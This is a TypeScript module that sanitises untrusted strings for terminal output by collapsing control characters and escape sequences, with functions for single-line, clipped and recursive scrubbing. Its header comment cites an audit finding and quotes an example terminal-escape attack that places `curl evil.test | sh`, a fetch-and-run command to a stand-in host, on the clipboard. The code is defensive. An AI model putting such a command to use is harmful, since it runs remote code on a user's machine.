/**
 * Somebody else's words, made safe to print on the terminal of the person running this command.
 *
 * A TERMINAL OBEYS WHAT IT IS HANDED. A row a member appended, a note an automation step kept, a pack's name: each is
 * written by somebody other than the person reading the line, and printed as kept, an ESC or a BEL in it is an
 * instruction. Audit thirty-seven finding 3 measured `automations show` passing a `set_var` answer through with OSC 52
 * (put `curl evil.test | sh` on the clipboard), OSC 0 (retitle the window) and CR plus CSI 2K (erase the line it came
 * on) intact. `brief.ts` and `session.ts` each had a private copy of the first half of this; one module now, so the next
 * command that prints a row does not have to find the copy to borrow.
 *
 * C1 AS WELL AS C0. U+009B and U+009D are the eight-bit spellings of CSI and OSC. Whether a terminal acts on them in
 * UTF-8 depends on the terminal, exactly as the audit says of the seven-bit ones, so the scrub does not bet on which
 * terminal the owner has. DEL goes with them. The copies this replaces stopped at U+001F.
 *
 * NEVER FOR `--json`. An agent is handed the record's value as the record sent it, and `JSON.stringify` escapes C0 on
 * the way out; scrubbing there would change data somebody may be branching on.
 */

/** One line of somebody else's words: every control character and run of space collapsed to one space, and trimmed. */
export const oneLine = (said: string): string => said.replace(/[\x00-\x1f\x7f-\x9f\s]+/g, ' ').trim();

/** One line of somebody else's words, cut to `max` characters with `...` when it is longer. */
export const clip = (said: string, max: number): string => {
  const one = oneLine(said);
  return one.length > max ? `${one.slice(0, max - 3)}...` : one;
};

/**
 * A copy of a record's answer with every string in it made `oneLine`, for building printed lines from.
 *
 * THE WHOLE VALUE, NOT FIELD BY FIELD. `automations show` prints eleven strings the record supplies and `scripts list`
 * fourteen, from a step's answer down to a date the record could send in any shape; the audit's brief named nine of
 * them. Scrubbing the answer once, before any line is built, means a field a later line starts printing is already
 * clean, and nobody has to remember that it came from somebody else.
 */
export function printable<T>(value: T): T {
  if (typeof value === 'string') return oneLine(value) as T;
  if (Array.isArray(value)) return value.map((v: unknown) => printable(v)) as T;
  if (value !== null && typeof value === 'object') return Object.fromEntries(Object.entries(value).map(([k, v]) => [k, printable(v)])) as T;
  return value;
}
